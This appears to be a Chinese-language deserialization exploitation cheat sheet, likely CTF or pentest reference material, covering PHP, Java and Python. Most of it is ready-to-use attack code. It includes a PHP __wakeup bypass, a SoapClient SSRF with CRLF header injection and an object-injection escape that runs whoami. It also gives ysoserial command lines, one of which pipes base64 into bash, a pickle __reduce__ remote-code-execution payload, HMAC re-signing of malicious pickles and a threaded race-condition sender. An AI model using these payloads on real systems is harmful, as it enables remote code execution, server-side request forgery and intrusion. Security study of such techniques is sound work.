# 反序列化利用链手册

## PHP 反序列化

### 基础概念
```php
// 序列化
$s = serialize($obj);  // O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"super";}

// 反序列化
$obj = unserialize($s);

// 魔术方法触发链
__construct() → __wakeup() → __destruct()
__toString() → __call() → __get()
```

### 常见利用链

#### 1. __wakeup 绕过（CVE-2017-12944 / PHP < 7.4）
```php
// 当属性数大于实际属性数时，__wakeup 不执行
O:4:"User":2:{...}   // 正常
O:4:"User":3:{...}   // 绕过 __wakeup（属性数 3 > 实际 2）
```

#### 2. __toString 触发
```php
class FileViewer {
    public $filename;
    function __toString() {
        return file_get_contents($this->filename);
    }
}
// 构造: O:10:"FileViewer":1:{s:8:"filename";s:8:"flag.php";}
```

#### 3. SoapClient CRLF 注入 (SSRF)
```php
$target = "http://internal-service/";
$client = new SoapClient(null, array(
    'uri' => "http://attacker/",
    'location' => $target,
    'user_agent' => "Attacker\r\nX-Forwarded-For: 127.0.0.1\r\nCookie: session=admin",
));
// 序列化后触发 SSRF + CRLF 头注入
echo urlencode(serialize($client));
```

#### 4. PHP 序列化长度操纵
```
// 利用字符串变长差异
// s:5:"admin" (5 字节) vs s:5:"admin" (可能被修改后长度不一致)
// 通过改变序列化字符串的长度值来截断或注入
```

### PHP 反序列化字符串逃逸

**增逃逸**（过滤后变长）：
```
// 过滤: "x" → "xx"（1→2，每处多1字节）
// 注入: 在可控属性中填入 ";}O:4:"Evil":1:{s:4:"cmd";s:6:"whoami";}
// 计算需要几个 "x" 来补足长度差
```

**减逃逸**（过滤后变短）：
```
// 过滤: "xx" → "x"（2→1，每处少1字节）
// 利用长度减少来吞掉后面的序列化字符串
```

## Java 反序列化

### 常见 Gadgets

| Gadget 链 | 影响组件 | 命令执行 |
|-----------|---------|---------|
| CommonsCollections1-7 | Apache Commons Collections | Runtime.exec() |
| CommonsBeanutils1 | Commons Beanutils | TemplatesImpl |
| Spring1 | Spring Framework | JdkDynamicProxy |
| Groovy1 | Groovy | MethodClosure |
| JBossInvoker | JBoss | InvokerTransformer |
| ROME | ROME | ObjectInstantiator |

### 检测方法
```
# 检查常见端口/路径
/invoker/readonly
/jmx-console/
/web-console/
/jbossws/
```

### ysoserial 常用 payload
```bash
java -jar ysoserial.jar CommonsCollections5 "cmd" > payload.bin
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,BASE64}|{base64,-d}|bash" > payload.bin
```

## Python 反序列化

### pickle 反序列化 RCE
```python
import pickle
import os

class Evil(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Evil())
# 发送 payload 到目标
```

### 签名绕过
```python
# 如果目标使用 HMAC 签名
# 1. 获取签名密钥（可能通过信息泄露）
# 2. 构造恶意 pickle 并重新签名
import hmac, hashlib
secret = b'secret_key'
payload = pickle.dumps(Evil())
signature = hmac.new(secret, payload, hashlib.sha256).hexdigest()
```

### __reduce__ 替代方案
```python
# 使用 __setstate__
class Evil:
    def __setstate__(self, state):
        os.system('id')
```

## 竞态条件利用

```python
import httpx
import threading

def exploit():
    # 在反序列化与验证之间的时间窗口
    r = httpx.post(url, content=payload)
    
# 并发发送
threads = [threading.Thread(target=exploit) for _ in range(50)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```
